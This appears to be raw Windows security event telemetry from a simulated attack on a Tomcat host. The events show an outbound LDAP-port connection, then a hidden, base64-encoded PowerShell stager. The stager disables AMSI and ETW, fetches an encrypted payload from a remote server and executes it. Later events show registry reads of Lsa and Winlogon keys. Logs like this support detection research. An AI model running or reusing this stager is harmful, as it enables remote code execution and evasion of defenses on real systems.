{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:07.507Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessID\"\u003e3936\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\programdata\\chocolatey\\lib\\tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe\u003c/Data\u003e\r\n  \u003cData Name=\"Direction\"\u003e%%14593\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e192.168.2.5\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e54225\u003c/Data\u003e\r\n  \u003cData Name=\"DestAddress\"\u003e192.168.3.5\u003c/Data\u003e\r\n  \u003cData Name=\"DestPort\"\u003e1389\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e6\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e69359\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14611\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e48\u003c/Data\u003e\r\n  \u003cData Name=\"RemoteUserID\"\u003eS-1-0-0\u003c/Data\u003e\r\n  \u003cData Name=\"RemoteMachineID\"\u003eS-1-0-0\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5156,"Activity":"5156 - The Windows Filtering Platform has allowed a connection.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:08.42Z","SourceSystem":"OpsManager","Account":"NT AUTHORITY\\LOCAL SERVICE","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventID":4688,"Activity":"4688 - A new process has been created.","CommandLine":"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAHcAQQB1AEEARABVAEEATwBnAEEAMABBAEQAUQBBAE0AdwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBYAGYAUwBWAEIAOwBbAEkASwAzAGUALQBnAHQAagBUACMAXgB6AEwANABEAF8APABFAC8ALgB2AHIAbwA9AE8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGwAWAB4AGMAQgBkAD0AdgBxAHcAdQBpAG8AagBTAC8AUQBjAGUAaQBMAE4AZABIAFcAdABaAGcAeQBWACsARABwAFkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==","MandatoryLabel":"S-1-16-16384","NewProcessId":"0x824","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessName":"C:\\ProgramData\\chocolatey\\lib\\Tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe","Process":"powershell.exe","ProcessId":"0xf60","SubjectAccount":"NT AUTHORITY\\LOCAL SERVICE","SubjectDomainName":"NT AUTHORITY","SubjectLogonId":"0x3e5","SubjectUserName":"LOCAL SERVICE","SubjectUserSid":"S-1-5-19","TargetAccount":"-\\-","TargetDomainName":"-","TargetLogonId":"0x0","TargetUserName":"-","TargetUserSid":"S-1-0-0","TokenElevationType":"%%1936","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:08.713Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-19\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eLOCAL SERVICE\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eNT AUTHORITY\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e5\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eKey\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x260\u003c/Data\u003e\r\n  \u003cData Name=\"TransactionId\"\u003e{00000000-0000-0000-0000-000000000000}\u003c/Data\u003e\r\n  \u003cData Name=\"AccessList\"\u003e%%4432 \t\t\t\t\u003c/Data\u003e\r\n  \u003cData Name=\"AccessReason\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"AccessMask\"\u003e0x1\u003c/Data\u003e\r\n  \u003cData Name=\"PrivilegeList\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"RestrictedSidCount\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x824\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"ResourceAttributes\"\u003e-\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4656,"Activity":"4656 - A handle to an object was requested.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:08.713Z","SourceSystem":"OpsManager","Account":"NT AUTHORITY\\LOCAL SERVICE","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventID":4688,"Activity":"4688 - A new process has been created.","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1","MandatoryLabel":"S-1-16-16384","NewProcessId":"0x2e04","NewProcessName":"C:\\Windows\\System32\\conhost.exe","ParentProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Process":"conhost.exe","ProcessId":"0x824","SubjectAccount":"NT AUTHORITY\\LOCAL SERVICE","SubjectDomainName":"NT AUTHORITY","SubjectLogonId":"0x3e5","SubjectUserName":"LOCAL SERVICE","SubjectUserSid":"S-1-5-19","TargetAccount":"-\\-","TargetDomainName":"-","TargetLogonId":"0x0","TargetUserName":"-","TargetUserSid":"S-1-0-0","TokenElevationType":"%%1936","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:08.713Z","SourceSystem":"OpsManager","Account":"NT AUTHORITY\\LOCAL SERVICE","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-19\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eLOCAL SERVICE\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eNT AUTHORITY\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e5\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eKey\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x260\u003c/Data\u003e\r\n  \u003cData Name=\"AccessList\"\u003e%%4432 \t\t\t\t\u003c/Data\u003e\r\n  \u003cData Name=\"AccessMask\"\u003e0x1\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x824\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"ResourceAttributes\"\u003e-\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4663,"Activity":"4663 - An attempt was made to access an object.","AccessList":"%%4432 \t\t\t\t","AccessMask":"0x1","HandleId":"0x260","ObjectName":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa","ObjectServer":"Security","ObjectType":"Key","Process":"powershell.exe","ProcessId":"0x824","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SubjectAccount":"NT AUTHORITY\\LOCAL SERVICE","SubjectDomainName":"NT AUTHORITY","SubjectLogonId":"0x3e5","SubjectUserName":"LOCAL SERVICE","SubjectUserSid":"S-1-5-19","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:08.763Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-19\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eLOCAL SERVICE\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eNT AUTHORITY\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e5\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eKey\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x384\u003c/Data\u003e\r\n  \u003cData Name=\"TransactionId\"\u003e{00000000-0000-0000-0000-000000000000}\u003c/Data\u003e\r\n  \u003cData Name=\"AccessList\"\u003e%%1538 \t\t\t\t%%4432 \t\t\t\t%%4435 \t\t\t\t%%4436 \t\t\t\t\u003c/Data\u003e\r\n  \u003cData Name=\"AccessReason\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"AccessMask\"\u003e0x20019\u003c/Data\u003e\r\n  \u003cData Name=\"PrivilegeList\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"RestrictedSidCount\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x824\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"ResourceAttributes\"\u003e-\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4656,"Activity":"4656 - A handle to an object was requested.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:09.017Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-19\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eLOCAL SERVICE\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eNT AUTHORITY\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e5\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eKey\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x548\u003c/Data\u003e\r\n  \u003cData Name=\"TransactionId\"\u003e{00000000-0000-0000-0000-000000000000}\u003c/Data\u003e\r\n  \u003cData Name=\"AccessList\"\u003e%%1538 \t\t\t\t%%4432 \t\t\t\t%%4435 \t\t\t\t%%4436 \t\t\t\t\u003c/Data\u003e\r\n  \u003cData Name=\"AccessReason\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"AccessMask\"\u003e0x20019\u003c/Data\u003e\r\n  \u003cData Name=\"PrivilegeList\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"RestrictedSidCount\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x824\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"ResourceAttributes\"\u003e-\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4656,"Activity":"4656 - A handle to an object was requested.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:09.017Z","SourceSystem":"OpsManager","Account":"NT AUTHORITY\\LOCAL SERVICE","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-19\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eLOCAL SERVICE\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eNT AUTHORITY\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e5\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eKey\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x548\u003c/Data\u003e\r\n  \u003cData Name=\"AccessList\"\u003e%%4432 \t\t\t\t\u003c/Data\u003e\r\n  \u003cData Name=\"AccessMask\"\u003e0x1\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x824\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"ResourceAttributes\"\u003e-\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4663,"Activity":"4663 - An attempt was made to access an object.","AccessList":"%%4432 \t\t\t\t","AccessMask":"0x1","HandleId":"0x548","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","ObjectServer":"Security","ObjectType":"Key","Process":"powershell.exe","ProcessId":"0x824","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SubjectAccount":"NT AUTHORITY\\LOCAL SERVICE","SubjectDomainName":"NT AUTHORITY","SubjectLogonId":"0x3e5","SubjectUserName":"LOCAL SERVICE","SubjectUserSid":"S-1-5-19","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:09.017Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-19\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eLOCAL SERVICE\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eNT AUTHORITY\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e5\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eKey\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x598\u003c/Data\u003e\r\n  \u003cData Name=\"TransactionId\"\u003e{00000000-0000-0000-0000-000000000000}\u003c/Data\u003e\r\n  \u003cData Name=\"AccessList\"\u003e%%1538 \t\t\t\t%%4432 \t\t\t\t%%4435 \t\t\t\t%%4436 \t\t\t\t\u003c/Data\u003e\r\n  \u003cData Name=\"AccessReason\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"AccessMask\"\u003e0x20019\u003c/Data\u003e\r\n  \u003cData Name=\"PrivilegeList\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"RestrictedSidCount\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x824\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"ResourceAttributes\"\u003e-\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4656,"Activity":"4656 - A handle to an object was requested.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:09.017Z","SourceSystem":"OpsManager","Account":"NT AUTHORITY\\LOCAL SERVICE","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-19\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eLOCAL SERVICE\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eNT AUTHORITY\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e5\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eKey\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x598\u003c/Data\u003e\r\n  \u003cData Name=\"AccessList\"\u003e%%4432 \t\t\t\t\u003c/Data\u003e\r\n  \u003cData Name=\"AccessMask\"\u003e0x1\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x824\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"ResourceAttributes\"\u003e-\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4663,"Activity":"4663 - An attempt was made to access an object.","AccessList":"%%4432 \t\t\t\t","AccessMask":"0x1","HandleId":"0x598","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","ObjectServer":"Security","ObjectType":"Key","Process":"powershell.exe","ProcessId":"0x824","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SubjectAccount":"NT AUTHORITY\\LOCAL SERVICE","SubjectDomainName":"NT AUTHORITY","SubjectLogonId":"0x3e5","SubjectUserName":"LOCAL 